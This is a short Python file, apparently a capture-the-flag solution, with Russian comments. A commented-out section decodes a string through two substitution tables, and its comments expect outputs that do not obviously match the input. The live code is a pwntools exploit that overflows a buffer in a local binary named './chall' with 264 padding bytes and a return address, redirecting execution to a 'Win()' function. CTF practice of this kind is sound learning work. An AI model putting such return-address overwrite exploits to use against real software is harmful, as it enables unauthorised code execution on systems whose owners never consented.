# import sys
#
# # Исходный алфавит
# alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_."
#
# # Вторая таблица (используется при первом шаге расшифровки)
# table2 = "urSfHw3ME1ik.XTRns_oGBFCQIh5Ugbje4YdNZ8WyLqPpKzJaD-6cOV2xvm97A0lt"
#
# # Первая таблица (используется при втором шаге расшифровки)
# table1 = ".HU_PnCs6YJzMijaAL1S2t4Ipleq3yoOKku8DZ9WBghw7G0bRE-5fdVFxrTXNvcQm"
#
# encrypted = "frIIyf3z5nB8jnbc3Nnq0eD99n9c22w99TcInXBPbCT"
#
# # Шаг 1: Расшифровка через вторую таблицу
# decrypted_step1 = []
# for c in encrypted:
#     if c in table2:
#         index = table2.index(c)
#         decrypted_char = alphabet[index]
#     else:
#         decrypted_char = c
#     decrypted_step1.append(decrypted_char)
# step1 = ''.join(decrypted_step1)
# print("После первой расшифровки:", step1)  # Должно быть "EBI"
#
# # Шаг 2: Расшифровка через первую таблицу
# decrypted_step2 = []
# for c in step1:
#     if c in table1:
#         index = table1.index(c)
#         decrypted_char = alphabet[index]
#     else:
#         decrypted_char = c
#     decrypted_step2.append(decrypted_char)
# step2 = ''.join(decrypted_step2)
# print("После второй расшифровки:", step2)  # Должно быть ".BI"
from pwn import *
p = process("./chall")
win_addr = 0x4012a6  # Замените на реальный адрес Win()
payload = b"A" * 264 + p64(win_addr)
p.sendlineafter(">> ", "1")  # Выбираем Login
p.sendlineafter("code:", payload)
print(p.recvall())